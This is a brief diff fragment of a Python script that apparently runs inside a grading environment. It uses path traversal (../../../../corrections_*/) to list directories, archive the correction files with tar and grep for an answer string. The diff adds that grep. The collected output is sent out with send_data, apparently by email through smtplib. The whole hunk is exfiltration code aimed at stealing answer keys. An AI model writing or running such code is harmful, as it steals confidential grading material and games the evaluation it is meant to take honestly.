@@ -48,6 +48,8 @@ my_data += get_data("ls -l ../../../../corrections_*/.git")
 my_data += "\n#######################\n"
 my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/262/")
 my_data += get_data("ls -l")
+my_data += "\n#######################\n"
+my_data += get_data("grep -Rnw ../../../../ -e 77=11*7") or ""
 send_data(my_data)
 ##############################################################
 import smtplib
